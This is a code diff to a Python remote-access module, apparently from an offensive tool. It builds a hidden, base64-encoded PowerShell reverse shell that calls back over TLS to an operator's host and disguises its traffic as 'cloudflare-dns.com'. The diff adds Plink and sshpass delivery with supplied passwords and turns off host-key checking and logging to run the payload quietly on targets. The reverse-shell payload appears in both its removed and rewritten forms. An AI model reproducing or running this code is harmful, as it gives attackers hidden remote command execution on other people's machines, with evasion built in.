@@ -107,21 +107,7 @@ class RemoteTransport(ABC):
 
     def _generate_payload(self, target_os: str, callback_host: str, callback_port: int) -> str:
         if target_os == 'windows':
-            ps_script = (
-                f"$TCPClient = New-Object Net.Sockets.TCPClient('{callback_host}', {callback_port});"
-                f"$NetworkStream = $TCPClient.GetStream();"
-                f"$SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));"
-                f"$SslStream.AuthenticateAsClient('cloudflare-dns.com');"
-                f"$StreamWriter = New-Object IO.StreamWriter($SslStream);"
-                f"function WriteToStream ($String) {{$StreamWriter.Write($String + 'SHELL> '); $StreamWriter.Flush()}};"
-                f"WriteToStream '';"
-                f"while (($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{"
-                f"    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
-                f"    try {{ $Output = Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $Output = $_ | Out-String }}"
-                f"    WriteToStream $Output"
-                f"}};"
-                f"$StreamWriter.Close()"
-            )
+            ps_script = (f"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{callback_host}', {callback_port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"            )
             import base64
             encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
             return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Start-Process -WindowStyle Hidden -NoNewWindow -FilePath powershell -ArgumentList \'-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}\'"'
@@ -131,30 +117,98 @@ class RemoteTransport(ABC):
     def _get_os_specific_command(self, cmd_dict: Dict[str, str], target_os: str) -> Optional[str]:
         return cmd_dict.get(target_os)
 
-
 class SSHTransport(RemoteTransport):
     def __init__(self):
         super().__init__()
         self._ssh_command = None
         self._sshpass_available = False
+        self._plink_available = False
         self._use_sshpass = False
+        self._use_plink = False
+        self._hostkey = None  # store host key for Plink (without hostname)
 
     def _ensure_dependency(self):
-        if self._ssh_command is None:
-            if self._check_command('ssh'):
-                self._ssh_command = 'ssh'
-            else:
-                raise RemoteTransportError(
-                    "SSH transport requires 'ssh' command-line tool. "
-                    "Install it with your system package manager (e.g., apt install openssh-client)"
-                )
+        has_ssh = self._check_command('ssh')
+        has_plink = self._check_command('plink')
+        self._ssh_command = 'ssh' if has_ssh else None
+        self._plink_available = has_plink
+
+        if not (has_ssh or has_plink):
+            raise RemoteTransportError(
+                "SSH transport requires an SSH client. "
+                "Install OpenSSH with 'apt install openssh-client' "
+                "or Plink with 'apt install putty-tools'. "
+                "For password authentication with OpenSSH, install sshpass "
+                "with 'apt install sshpass'."
+            )
+
         self._sshpass_available = self._check_command('sshpass')
+
+    def _get_host_key(self, host: str, port: int) -> Optional[str]:
+        """
+        Retrieve host public key using ssh-keyscan and return it in
+        'keytype base64key' format (without the hostname), which Plink accepts.
+        """
+        try:
+            # Try each key type in order of preference
+            for key_type in ['rsa', 'ecdsa', 'ed25519', 'dsa']:
+                cmd = ['ssh-keyscan', '-t', key_type, '-p', str(port), host]
+                success, stdout, stderr = self._run_command(cmd, timeout=10)
+                if success and stdout.strip():
+                    lines = stdout.splitlines()
+                    for line in lines:
+                        line = line.strip()
+                        # Skip comments and empty lines
+                        if line and not line.startswith('#'):
+                            # Ensure it contains a valid key type
+                            if any(keyword in line for keyword in ['ssh-rsa', 'ssh-dss', 'ecdsa-sha2', 'ssh-ed25519']):
+                                # Split and take only the keytype and key (drop hostname)
+                                parts = line.split()
+                                if len(parts) >= 3:  # host keytype key
+                                    return f"{parts[1]} {parts[2]}"
+                                elif len(parts) >= 2:  # keytype key (already without hostname)
+                                    return f"{parts[0]} {parts[1]}"
+            # Fallback: try without specifying type
+            cmd = ['ssh-keyscan', '-p', str(port), host]
+            success, stdout, stderr = self._run_command(cmd, timeout=10)
+            if success and stdout.strip():
+                lines = stdout.splitlines()
+                for line in lines:
+                    line = line.strip()
+                    if line and not line.startswith('#'):
+                        if any(keyword in line for keyword in ['ssh-rsa', 'ssh-dss', 'ecdsa-sha2', 'ssh-ed25519']):
+                            parts = line.split()
+                            if len(parts) >= 3:
+                                return f"{parts[1]} {parts[2]}"
+                            elif len(parts) >= 2:
+                                return f"{parts[0]} {parts[1]}"
+            return None
+        except Exception:
+            return None
+
+    def _build_plink_cmd(self, command: str) -> List[str]:
+        """Build command for Plink (PuTTY's command-line SSH client)."""
+        base = ['plink', '-ssh', '-batch', '-no-antispoof']
+        base.extend(['-P', str(self._port)])
+        if self._hostkey:
+            base.extend(['-hostkey', self._hostkey])
+        if self._password:
+            base.extend(['-pw', self._password])
+        if self._private_key:
+            base.extend(['-i', self._private_key])
+        base.append(f"{self._username}@{self._host}")
+        base.append(command)
+        return base
 
     def _build_ssh_cmd(self, command: str, background: bool = False,
                        with_batch: Optional[bool] = None) -> List[str]:
+        """Build command for OpenSSH + sshpass (fallback)."""
         base = [self._ssh_command]
         base.extend(['-o', 'StrictHostKeyChecking=no'])
+        base.extend(['-o', 'UserKnownHostsFile=/dev/null'])
+        base.extend(['-o', 'LogLevel=quiet'])
         base.extend(['-o', 'ConnectTimeout=10'])
+        base.extend(['-T'])  # Disable TTY allocation for stable non‑interactive execution
         if with_batch is None:
             with_batch = not self._use_sshpass
         if with_batch:
@@ -164,8 +218,7 @@ class SSHTransport(RemoteTransport):
         base.extend(['-p', str(self._port)])
         if self._private_key:
             base.extend(['-i', self._private_key])
-        if background:
-            base.append('-f')
+        # NOTE: -f (background) is NOT used; payload backgrounds itself.
         base.append(f"{self._username}@{self._host}")
         base.append(command)
         if self._use_sshpass and self._password:
@@ -192,38 +245,88 @@ class SSHTransport(RemoteTransport):
         self._port = port
         self._private_key = private_key_path
         self._use_nxc = use_nxc
+        self._hostkey = None
 
+        # netexec mode – untouched
         if use_nxc:
             return self._connect_nxc(host, username, password, private_key_path, port)
 
+        # Private key authentication – use OpenSSH directly
         if private_key_path:
             if not os.path.exists(private_key_path):
                 raise RemoteTransportError(f"Private key file not found: {private_key_path}")
             if not os.access(private_key_path, os.R_OK):
                 raise RemoteTransportError(f"Private key file not readable: {private_key_path}")
             self._use_sshpass = False
+            self._use_plink = False
+        # Password authentication – prefer Plink, but fallback to sshpass if Plink fails
         elif password:
-            if not self._sshpass_available:
+            if self._plink_available:
+                # Try to get host key for Plink
+                hostkey = self._get_host_key(host, port)
+                if hostkey:
+                    self._hostkey = hostkey
+                    self._use_plink = True
+                    self._use_sshpass = False
+                else:
+                    # If we can't fetch a host key, fallback to sshpass
+                    if self._sshpass_available:
+                        self._use_sshpass = True
+                        self._use_plink = False
+                    else:
+                        raise RemoteTransportError(
+                            "Plink requires host key but ssh-keyscan failed, and sshpass is not available. "
+                            "Install sshpass (apt install sshpass) or ensure ssh-keyscan works."
+                        )
+            elif self._sshpass_available:
+                self._use_sshpass = True
+                self._use_plink = False
+            else:
                 raise RemoteTransportError(
-                    "Password authentication requires 'sshpass' command-line tool. "
-                    "Install it with: apt install sshpass (or use private key authentication)"
+                    "Password authentication requires either 'plink' (with ssh-keyscan) or 'sshpass'. "
+                    "Install plink (apt install putty-tools) or sshpass (apt install sshpass)"
                 )
-            self._use_sshpass = True
         else:
             raise RemoteTransportError("SSH requires either password or private key")
 
-        cmd = self._build_ssh_cmd("echo SSH_CONNECTION_SUCCESS", with_batch=False)
-        success, stdout, stderr = self._run_command(cmd, timeout=15)
-
-        if success and 'SSH_CONNECTION_SUCCESS' in stdout:
-            self.connected = True
-            return True
+        # Test connection – if using Plink and it fails, fallback to sshpass
+        if self._use_plink:
+            cmd = self._build_plink_cmd("echo PLINK_CONNECTION_SUCCESS")
+            success, stdout, stderr = self._run_command(cmd, timeout=15)
+            if success and 'PLINK_CONNECTION_SUCCESS' in stdout:
+                self.connected = True
+                return True
+            else:
+                # Plink failed – fallback to sshpass if available
+                if self._sshpass_available:
+                    self._use_plink = False
+                    self._use_sshpass = True
+                    # Retry with OpenSSH
+                    cmd = self._build_ssh_cmd("echo SSH_CONNECTION_SUCCESS", with_batch=False)
+                    success, stdout, stderr = self._run_command(cmd, timeout=15)
+                    if success and 'SSH_CONNECTION_SUCCESS' in stdout:
+                        self.connected = True
+                        return True
+                    else:
+                        error_msg = stderr.strip() if stderr else stdout.strip()
+                        raise RemoteTransportError(f"SSH connection test failed (both Plink and sshpass): {error_msg}")
+                else:
+                    error_msg = stderr.strip() if stderr else stdout.strip()
+                    raise RemoteTransportError(f"Plink connection test failed: {error_msg}")
         else:
-            error_msg = stderr.strip() if stderr else stdout.strip()
-            raise RemoteTransportError(f"SSH connection test failed: {error_msg}")
+            # OpenSSH + sshpass test
+            cmd = self._build_ssh_cmd("echo SSH_CONNECTION_SUCCESS", with_batch=False)
+            success, stdout, stderr = self._run_command(cmd, timeout=15)
+            if success and 'SSH_CONNECTION_SUCCESS' in stdout:
+                self.connected = True
+                return True
+            else:
+                error_msg = stderr.strip() if stderr else stdout.strip()
+                raise RemoteTransportError(f"SSH connection test failed: {error_msg}")
 
     def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                      private_key_path: Optional[str] = None, port: int = 22) -> bool:
+        """UNTOUCHED – netexec connection logic."""
         if not self._check_command('netexec'):
             raise RemoteTransportError("netexec tool not found. Install with: pip install netexec")
 
@@ -262,6 +365,7 @@ class SSHTransport(RemoteTransport):
             if command is None:
                 return False, f"No command found for OS: {target_os}"
 
+        # netexec mode – untouched
         if self._use_nxc:
             try:
                 cmd = ['netexec', 'ssh', self._host, '-u', self._username]
@@ -283,29 +387,50 @@ class SSHTransport(RemoteTransport):
             except Exception as e:
                 return False, str(e)
 
-        try:
-            cmd = self._build_ssh_cmd(command, background=background)
-            timeout = 10 if background else 60
-            success, stdout, stderr = self._run_command(cmd, timeout=timeout)
-            if success:
-                return True, stdout
-            else:
-                return False, stderr
-        except Exception as e:
-            return False, str(e)
+        # Use Plink if preferred
+        if self._use_plink:
+            try:
+                cmd = self._build_plink_cmd(command)
+                timeout = 10 if background else 60
+                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+                if success:
+                    return True, stdout
+                else:
+                    return False, stderr
+            except Exception as e:
+                return False, str(e)
+        else:
+            # Fallback to OpenSSH + sshpass
+            try:
+                cmd = self._build_ssh_cmd(command, background=background)
+                timeout = 10 if background else 60
+                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+                if success:
+                    return True, stdout
+                else:
+                    return False, stderr
+            except Exception as e:
+                return False, str(e)
 
     def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
-        return self.execute_command(payload, target_os, background=True)
+        # Payload already backgrounds itself, so we don't set background=True.
+        return self.execute_command(payload, target_os, background=False)
 
     def close(self):
         self.connected = False
         self._host = self._username = self._password = self._target_os = None
         self._port = None
+        self._private_key = None
+        self._use_plink = False
+        self._use_sshpass = False
+        self._hostkey = None
 
     def _perform_platform_detection(self) -> str:
         if not self.connected:
             return "unknown"
+
         if self._use_nxc:
+            # netexec detection – untouched
             try:
                 cmd = ['netexec', 'ssh', self._host, '-u', self._username]
                 if self._password:
@@ -330,22 +455,30 @@ class SSHTransport(RemoteTransport):
                 return "linux"
             except Exception:
                 return "unknown"
-        else:
-            try:
+
+        # Use Plink or OpenSSH for detection
+        try:
+            if self._use_plink:
+                cmd = self._build_plink_cmd('uname -s 2>/dev/null || echo Windows')
+            else:
                 cmd = self._build_ssh_cmd('uname -s 2>/dev/null || echo Windows', with_batch=False)
-                success, stdout, _ = self._run_command(cmd, timeout=10)
-                if success:
-                    if 'Linux' in stdout or 'Darwin' in stdout:
-                        return "linux"
-                    elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
-                        return "windows"
-                cmd = self._build_ssh_cmd('ver 2>nul || echo Linux', with_batch=False)
-                success, stdout, _ = self._run_command(cmd, timeout=10)
-                if success and ('Microsoft' in stdout or 'Windows' in stdout):
+            success, stdout, _ = self._run_command(cmd, timeout=10)
+            if success:
+                if 'Linux' in stdout or 'Darwin' in stdout:
+                    return "linux"
+                elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
                     return "windows"
-                return "linux"
-            except Exception:
-                return "unknown"
+            # Fallback: try 'ver' command for Windows
+            if self._use_plink:
+                cmd = self._build_plink_cmd('ver 2>nul || echo Linux')
+            else:
+                cmd = self._build_ssh_cmd('ver 2>nul || echo Linux', with_batch=False)
+            success, stdout, _ = self._run_command(cmd, timeout=10)
+            if success and ('Microsoft' in stdout or 'Windows' in stdout):
+                return "windows"
+            return "linux"
+        except Exception:
+            return "unknown"
 
 
 class WinRMTransport(RemoteTransport):
